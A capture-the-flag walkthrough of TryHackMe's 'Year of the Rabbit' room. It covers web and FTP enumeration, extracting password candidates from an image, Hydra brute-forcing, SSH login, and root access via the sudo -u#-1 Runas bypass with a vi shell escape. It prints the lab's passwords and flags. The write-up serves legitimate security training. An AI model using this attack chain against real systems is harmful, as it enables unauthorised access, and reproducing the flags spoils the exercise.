# TryHackMe — Year of the Rabbit

> **Focus:** Service enumeration, web enumeration, FTP password discovery, steganography, SSH access, Linux enumeration, and sudo privilege escalation.

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Platform](https://img.shields.io/badge/Platform-Linux-blue?logo=linux)


---

## Attack Path Summary

```text
Nmap scan
   |
   v
FTP / SSH / HTTP discovered
   |
   v
DIRB finds /assets/
   |
   v
Inspect stylesheet and browser requests
   |
   v
Discover hidden web directories
   |
   v
Download Hot_Babe.png
   |
   v
Extract FTP username and password candidates
   |
   v
Hydra finds valid ftpuser password
   |
   v
FTP download: Eli's_Creds.txt
   |
   v
Recover eli SSH credentials
   |
   v
SSH as eli
   |
   v
Find /usr/games/s3cr3t hidden message
   |
   v
Recover Gwendoline's password
   |
   v
Switch to gwendoline and read user flag
   |
   v
sudo -l reveals restricted vi permission
   |
   v
sudo -u#-1 + vi shell escape
   |
   v
Root shell and root flag
```

---

## 1. Nmap Enumeration

Begin by scanning the target to identify open ports and service versions.

```bash
nmap -sV -sC <TARGET_IP>
```

The scan in the screenshot identified three open ports:

|  Port  | Service |      Version / Details       |
|--------|---------|------------------------------|
| 21/tcp |   FTP   |         vsftpd 3.0.2         |
| 22/tcp |   SSH   |     OpenSSH 6.7p1 Debian     |
| 80/tcp |   HTTP  | Apache httpd 2.4.10 (Debian) |

<img width="818" height="353" alt="1" src="https://github.com/user-attachments/assets/6c43b0a2-1562-4bba-b6fa-6d6ba25ec2c8" />

FTP, SSH, and HTTP are available. Continue with web enumeration and inspect the FTP service for accessible files.

## 2. Web Enumeration

Use DIRB to discover directories and files on the web server.

```bash
dirb http://<TARGET_IP>
```

The scan discovered the `/assets/` directory and also tested the `/faqs` path.

<img width="491" height="325" alt="2" src="https://github.com/user-attachments/assets/3e0011d9-23bc-4880-a6b9-47fcb803a79c" />

Open the discovered assets directory:

```text
http://<TARGET_IP>/assets/
```

Directory listing is enabled. It exposes the site's image and stylesheet assets.

<img width="603" height="312" alt="3" src="https://github.com/user-attachments/assets/4181237b-2694-4805-86e7-f9113747be67" />

Inspect the stylesheet:

```text
http://<TARGET_IP>/assets/style.css
```

The stylesheet includes a comment that hints at checking the stylesheet. This is a reminder to inspect source files and comments rather than relying only on the visible page.

<img width="698" height="346" alt="4" src="https://github.com/user-attachments/assets/9e4b8ebd-05f7-42d4-9630-07e6a064c0fb" />

## 3. Discovering the Hidden Directory

While inspecting the web application in the browser's developer tools, the request history reveals a redirect involving `intermediary.php` and a hidden directory path.

The discovered path is:

```text
/sup3r_s3cret_fl4g/
```

<img width="1277" height="507" alt="5" src="https://github.com/user-attachments/assets/fcb7c15a-16b9-41d9-bf71-fd3b7cc01b82" />

Browse to the hidden directory:

```text
http://<TARGET_IP>/sup3r_s3cret_fl4g/
```

The page redirects to another directory, which is visible in the browser address bar:

```text
/WExYY2Cv-qU/
```

<img width="702" height="291" alt="6" src="https://github.com/user-attachments/assets/1a54dd9b-77b2-4a56-a7ab-7ffb6e4813b2" />

Open the directory and inspect the image file:

```text
http://<TARGET_IP>/WExYY2Cv-qU/Hot_Babe.png
```

<img width="1165" height="177" alt="7" src="https://github.com/user-attachments/assets/5a5b73c1-37f6-4881-b0f5-4ba4c3df951c" />

Download the image for analysis:

```bash
wget http://<TARGET_IP>/WExYY2Cv-qU/Hot_Babe.png
```

<img width="617" height="291" alt="8" src="https://github.com/user-attachments/assets/29701ab8-beef-48bb-b55a-6d012c70e34a" />

## 4. Finding the FTP Password List

Start by checking the downloaded image for readable strings.

```bash
strings Hot_Babe.png
```

<img width="243" height="124" alt="9-1" src="https://github.com/user-attachments/assets/23d81f40-e022-48e5-978c-94991cc6a3f0" />

The output includes a message indicating that the FTP username is `ftpuser` and that one of the listed values is its password. The message provides a set of password candidates.

<img width="492" height="219" alt="9-2" src="https://github.com/user-attachments/assets/0b230700-ebe1-4a35-9222-bfb18fa36b80" />

Create a wordlist file named `check.txt` containing the candidate passwords from the message. Preserve the characters exactly as shown in the screenshot.

## 5. Brute-Forcing FTP Credentials

Use Hydra with the known username and the candidate password list.

```bash
hydra -l ftpuser -P check.txt ftp://<TARGET_IP> -vv
```

Hydra identifies a valid FTP password in the supplied wordlist.

<img width="832" height="254" alt="10-1" src="https://github.com/user-attachments/assets/f211ac59-be54-4727-a02a-5ebe1f12dd12" />

The successful credential shown in the result is:

```text
Username: ftpuser
Password: 5iez1wGXKFPKQ
```

<img width="670" height="42" alt="10-2" src="https://github.com/user-attachments/assets/75d22783-b2bb-4f76-9579-33ad7193b907" />

## 6. FTP Enumeration

Connect to the FTP service using the recovered credentials.

```bash
ftp <TARGET_IP>
```

Enter the username and password when prompted.

<img width="309" height="187" alt="11" src="https://github.com/user-attachments/assets/b49900ae-d779-4e08-9c23-f50aad65a50d" />

List the remote directory contents:

```text
ftp> ls
```

The server contains a file named `Eli's_Creds.txt`. Download it:

```text
ftp> get Eli's_Creds.txt
```

<img width="590" height="214" alt="12" src="https://github.com/user-attachments/assets/f778de0c-a103-4dec-8667-459eb05e5ce3" />

## 7. Decoding the Credentials File

Inspect the downloaded file:

```bash
cat Eli\'s_Creds.txt
```

The content is not immediately readable and appears to be encoded using a visual/text substitution. The screenshot's decoded result provides the SSH credentials:

```text
Username: eli
Password: DSpD1M1wAEwid
```

<img width="623" height="215" alt="13-1" src="https://github.com/user-attachments/assets/174e8d5d-f02b-46a2-8682-4a07b6b4bf07" />

<img width="193" height="87" alt="13-2" src="https://github.com/user-attachments/assets/1005065b-c27d-449a-815b-237b5b56ad65" />

Use the recovered credentials to attempt SSH access.

## 8. SSH Access as eli

Connect to SSH:

```bash
ssh eli@<TARGET_IP>
```

After logging in, a message from root is displayed. It is addressed to Gwendoline and instructs her to check a “leet s3cr3t hiding place.”

<img width="726" height="392" alt="14" src="https://github.com/user-attachments/assets/ee33bdaf-d890-484a-a2b4-83833a91ada3" />

This message suggests that further enumeration should focus on the local filesystem and the other user's files.

## 9. Enumerating Local Users and Files

List the home directories:

```bash
ls /home
```

The system contains the users `eli` and `gwendoline`.

Attempting to read Gwendoline's user flag as `eli` is denied:

```bash
cat /home/gwendoline/user.txt
```

<img width="595" height="194" alt="15" src="https://github.com/user-attachments/assets/77b93108-9d75-43d8-b3ed-9860258f3538" />

The message from root mentions a secret location. Search the filesystem for a directory named `s3cr3t`:

```bash
find / -name "s3cr3t" 2>/dev/null
```

The search identifies:

```text
/usr/games/s3cr3t
```

Inspect the directory:

```bash
cd /usr/games/s3cr3t
ls -la
```

A hidden message file is present:

```text
.this_m3ss4ag3_15_f0r_gw3nd0lin3_Only
```

<img width="667" height="151" alt="16" src="https://github.com/user-attachments/assets/eed8d89a-f5e4-49fb-964d-98703a7cbf69" />

Read the hidden file:

```bash
cat .this_m3ss4ag3_15_f0r_gw3nd0lin3_Only
```

The message criticizes Gwendoline's weak password and reveals it:

```text
MniVCQVhQHUN
```

<img width="716" height="124" alt="17" src="https://github.com/user-attachments/assets/1acb0765-0544-4ae2-bd37-df5bd1c6cf24" />

## 10. Finding Gwendoline's Password

The hidden message provides the password for the `gwendoline` account. Switch users:

```bash
su gwendoline
```

Enter the password recovered from the message:

```text
MniVCQVhQHUN
```

Verify the current account:

```bash
id
```

The command confirms that the session is running as `gwendoline`.

<img width="539" height="80" alt="18" src="https://github.com/user-attachments/assets/bee191d7-e70b-4c10-b28e-23201b84fada" />

## 11. Accessing Gwendoline's Account

Navigate to Gwendoline's home directory and inspect its contents.

```bash
cd /home/gwendoline
ls -la
```

The account's `user.txt` file is now accessible.

<img width="510" height="113" alt="19" src="https://github.com/user-attachments/assets/c8a94c7f-3bc7-463b-a8d7-159f64af1956" />

## 12. User Flag

Read the user flag:

```bash
cat user.txt
THM{1107174691af9ff3681d2b5db5740b1589bae53}
```

## 13. Sudo Enumeration

Check which commands Gwendoline can execute with sudo:

```bash
sudo -l
```

The output shows the following rule:

```text
(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

This sudoers rule appears to allow the user to run `vi` as any user except root. The `!root` restriction is vulnerable to a known sudo Runas user ID validation issue: specifying UID `-1` can be treated as UID 0.

<img width="873" height="118" alt="20-1" src="https://github.com/user-attachments/assets/1954c5b9-d588-4cd0-b862-a6dd86071e41" />

## 14. Privilege Escalation to Root

Use the permitted `vi` command while specifying the Runas user as `-1`:

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

Inside `vi`, execute a shell:

```vim
:!/bin/bash
```

<img width="140" height="43" alt="20-2" src="https://github.com/user-attachments/assets/fa5204d4-9e68-4715-af59-14307b03bbb8" />

Check the current identity:

```bash
id
```

The result confirms root privileges:

```text
uid=0(root) gid=0(root) groups=0(root)
```

<img width="400" height="42" alt="21" src="https://github.com/user-attachments/assets/ce0344ca-f6c1-4540-b2d6-78f0921fdfef" />

## 15. Root Flag

Navigate to the root user's home directory and read `root.txt`.

```bash
cd /root
ls
cat root.txt

THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```

<img width="440" height="133" alt="22" src="https://github.com/user-attachments/assets/c6828eae-546a-46d1-9565-31f768f93f31" />

